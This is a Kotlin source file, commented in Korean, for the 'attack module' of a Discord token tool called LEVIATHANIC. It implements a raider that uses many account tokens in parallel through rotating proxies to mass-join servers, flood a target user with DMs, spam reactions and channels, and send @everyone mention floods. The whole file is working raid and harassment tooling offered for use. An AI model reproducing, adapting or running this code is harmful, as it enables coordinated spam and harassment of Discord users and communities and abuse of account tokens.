// LEVIATHANIC 토큰 생성기 - 토큰 레이더 (공격 모듈)
// 제작자 제프리 - https://discord.gg/leviathanic
//
// 참고 소스:
//   - Zetrium guild_joiner / dm_spammer / reaction_spammer / channel_spammer
//
// 지원 공격 유형:
//   1) JOIN     - 다수 토큰으로 서버 조인 (invite 코드)
//   2) DM_SPAM  - 다수 토큰으로 타겟 유저에게 DM 폭격
//   3) REACT    - 메시지에 리액션 폭격
//   4) CH_SPAM  - 채널에 대량 메시지 도배
//   5) MENTION  - 서버 전체 멘션 폭격

package gg.leviathanic.levigen

import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.sync.Semaphore
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

enum class RaidType(val label: String) {
    JOIN("서버 조인"),
    DM_SPAM("DM 폭격"),
    REACT("리액션 폭격"),
    CH_SPAM("채널 도배"),
    MENTION("멘션 폭격"),
}

class TokenRaider(
    private val tokens: List<String>,
    private val type: RaidType,
    private val target: String,           // invite / userId / "channelId:messageId" / channelId
    private val payload: String = "",     // message / emoji
    private val proxies: List<String> = emptyList(),
    private val perTokenCount: Int = 1,   // 토큰당 반복 횟수
    private val parallel: Int = 10,
) {
    data class State(
        val done: Int = 0,
        val total: Int = 0,
        val success: Int = 0,
        val failed: Int = 0,
        val running: Boolean = false,
        val lastLog: List<String> = emptyList(),
    ) {
        val pct: Int get() = if (total == 0) 0 else (done * 100 / total)
    }

    private val _state = MutableStateFlow(State(total = tokens.size * perTokenCount))
    val state: StateFlow<State> = _state.asStateFlow()

    private val done = AtomicInteger(0)
    private val ok = AtomicInteger(0)
    private val fail = AtomicInteger(0)
    private val logQueue = ArrayDeque<String>()
    private val logLock = kotlinx.coroutines.sync.Mutex()

    private val JSON = "application/json; charset=utf-8".toMediaType()
    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .build()
    }

    private var proxyIdx = 0
    private fun nextProxy(): String? {
        if (proxies.isEmpty()) return null
        val p = proxies[proxyIdx % proxies.size]
        proxyIdx++
        return p
    }

    private suspend fun pushLog(line: String) {
        logLock.withLock {
            logQueue.addFirst(line)
            while (logQueue.size > 20) logQueue.removeLast()
        }
    }

    private fun authHeaders(token: String) = mapOf(
        "Authorization" to token,
        "Content-Type" to "application/json",
        "User-Agent" to
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
            "Chrome/126.0.0.0 Safari/537.36",
    )

    /** 서버 조인 - POST /invites/{code}. */
    private fun doJoin(token: String): Boolean {
        return try {
            val code = target.substringAfterLast("/").substringBefore("?")
            val req = Request.Builder()
                .url("https://discord.com/api/v9/invites/$code")
                .post("".toRequestBody(JSON))
                .apply { authHeaders(token).forEach { (k, v) -> header(k, v) } }
                .build()
            client.newCall(req).execute().use { it.code in 200..299 }
        } catch (_: Exception) { false }
    }

    /** DM 폭격 - 1) DM 채널 생성 2) 메시지 전송. */
    private fun doDmSpam(token: String): Boolean {
        return try {
            // DM 채널 생성 요청
            val createBody = JSONObject().put("recipients",
                org.json.JSONArray().put(target)).toString()
            val createReq = Request.Builder()
                .url("https://discord.com/api/v9/users/@me/channels")
                .post(createBody.toRequestBody(JSON))
                .apply { authHeaders(token).forEach { (k, v) -> header(k, v) } }
                .build()
            val channelId = client.newCall(createReq).execute().use { r ->
                if (r.code !in 200..299) return false
                JSONObject(r.body?.string() ?: "{}").optString("id").ifEmpty { return false }
            }
            // 메시지 전송
            val msgBody = JSONObject().put("content", payload).toString()
            val msgReq = Request.Builder()
                .url("https://discord.com/api/v9/channels/$channelId/messages")
                .post(msgBody.toRequestBody(JSON))
                .apply { authHeaders(token).forEach { (k, v) -> header(k, v) } }
                .build()
            client.newCall(msgReq).execute().use { it.code in 200..299 }
        } catch (_: Exception) { false }
    }

    /** 리액션 폭격 - PUT /channels/{ch}/messages/{msg}/reactions/{emoji}/@me. */
    private fun doReact(token: String): Boolean {
        return try {
            val parts = target.split(":")
            if (parts.size != 2) return false
            val (ch, msg) = parts
            val emoji = java.net.URLEncoder.encode(payload, "UTF-8")
            val req = Request.Builder()
                .url("https://discord.com/api/v9/channels/$ch/messages/$msg/reactions/$emoji/%40me")
                .put("".toRequestBody(JSON))
                .apply { authHeaders(token).forEach { (k, v) -> header(k, v) } }
                .build()
            client.newCall(req).execute().use { it.code in 200..299 }
        } catch (_: Exception) { false }
    }

    /** 채널 도배 - POST /channels/{ch}/messages. */
    private fun doChannelSpam(token: String): Boolean {
        return try {
            val body = JSONObject().put("content", payload).toString()
            val req = Request.Builder()
                .url("https://discord.com/api/v9/channels/$target/messages")
                .post(body.toRequestBody(JSON))
                .apply { authHeaders(token).forEach { (k, v) -> header(k, v) } }
                .build()
            client.newCall(req).execute().use { it.code in 200..299 }
        } catch (_: Exception) { false }
    }

    /** 멘션 폭격 - 채널에 @everyone + payload 전송. */
    private fun doMention(token: String): Boolean {
        return try {
            val body = JSONObject().put("content", "@everyone $payload").toString()
            val req = Request.Builder()
                .url("https://discord.com/api/v9/channels/$target/messages")
                .post(body.toRequestBody(JSON))
                .apply { authHeaders(token).forEach { (k, v) -> header(k, v) } }
                .build()
            client.newCall(req).execute().use { it.code in 200..299 }
        } catch (_: Exception) { false }
    }

    /** 공격 1회 실행. */
    private fun attack(token: String): Boolean = when (type) {
        RaidType.JOIN     -> doJoin(token)
        RaidType.DM_SPAM  -> doDmSpam(token)
        RaidType.REACT    -> doReact(token)
        RaidType.CH_SPAM  -> doChannelSpam(token)
        RaidType.MENTION  -> doMention(token)
    }

    private fun shortTok(t: String): String =
        if (t.length < 20) t else t.take(12) + "..." + t.takeLast(4)

    suspend fun run() = coroutineScope {
        val total = tokens.size * perTokenCount
        _state.value = _state.value.copy(running = true, total = total)

        val sem = Semaphore(parallel)
        val jobs = mutableListOf<Deferred<Unit>>()

        for (token in tokens) {
            repeat(perTokenCount) {
                jobs += async(Dispatchers.IO) {
                    sem.acquire()
                    try {
                        val success = attack(token)
                        if (success) {
                            ok.incrementAndGet()
                            pushLog("+ ok  · ${shortTok(token)}")
                        } else {
                            fail.incrementAndGet()
                            pushLog("- err · ${shortTok(token)}")
                        }
                        done.incrementAndGet()
                    } finally { sem.release() }
                }
            }
        }

        val progressJob = launch {
            while (done.get() < total) {
                delay(300)
                _state.value = State(
                    done = done.get(),
                    total = total,
                    success = ok.get(),
                    failed = fail.get(),
                    running = true,
                    lastLog = logLock.withLock { logQueue.toList() },
                )
            }
        }

        jobs.awaitAll()
        progressJob.cancel()

        _state.value = State(
            done = done.get(),
            total = total,
            success = ok.get(),
            failed = fail.get(),
            running = false,
            lastLog = logLock.withLock { logQueue.toList() },
        )
    }
}
